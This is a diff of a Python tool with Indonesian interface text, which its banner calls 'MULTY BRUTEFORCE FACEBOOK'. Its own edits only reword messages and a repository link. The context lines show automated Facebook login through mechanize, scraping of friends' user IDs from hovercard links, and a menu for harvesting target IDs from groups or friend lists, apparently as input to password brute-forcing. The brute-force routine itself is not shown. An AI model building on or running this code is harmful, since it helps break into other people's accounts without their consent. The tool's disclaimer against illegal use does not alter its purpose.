@@ -105,7 +105,7 @@ def login():
 	global log
 	us = inputD('[?]Email/HP')
 	pa = inputD('[?]Kata Sandi')
-	tampil('\rh[*]Sedang Login....')
+	tampil('\rh[*]Sedang Masuk....')
 	buka('https://m.facebook.com')
 	br.select_form(nr=0)
 	br.form['email']=us
@@ -113,17 +113,17 @@ def login():
 	br.submit()
 	url = br.geturl()
 	if 'save-device' in url or 'm_sess' in url:
-		tampil('\rh[*]Login Berhasil')
+		tampil('\rh[*]Masuk Berhasil')
 		buka('https://mobile.facebook.com/home.php')
 		nama = br.find_link(url_regex='logout.php').text
 		nama = re.findall(r'\((.*a?)\)',nama)[0]
-		tampil('\rh[*]Selamat datang \rk%s\n\rh[*]Semoga ini adalah hari keberuntungan mu....'%nama)
+		tampil('\rh[*]Selamat datang Kawan \rk%s\n\rh[*]Semoga ini adalah hari keberuntungan mu :)...'%nama)
 		log = 1
 	elif 'checkpoint' in url:
 		tampil('\rm[!]Akun kena checkpoint\n\rk[!]Coba Login dengan opera mini')
 		keluar()
 	else:
-		tampil('\rm[!]Login Gagal')
+		tampil('\rm[!]Masuk Gagal')
 def saring_id_teman(r):
 	for i in re.findall(r'/friends/hovercard/mbasic/\?uid=(.*?)&',r):
 		id_bteman.append(i)
@@ -339,7 +339,7 @@ def menu():
 \rk###########################################################
 #             \rb*MULTY BRUTEFORCE FACEBOOK*\rk                 #
 # \rhBY\rp                                            f4dl\rk#
-# \rhGitHub\rp                      https://github.com/f4dl/gas/blob/master/mbf\rk#
+# \rhGitHub\rp                      https://github.com/f4dl/gas.git\rk#
 #       \rmDo Not Use This Tool For IllegaL Purpose          \rk#
 ###########################################################''')
 	tampil('''\rk%s\n\rc1 \rhAmbil id dari group\n\rc2 \rhAmbil id dari daftar teman\n\rc3 \rmKELUAR\n\rk%s'''%('#'*20,'#'*20))
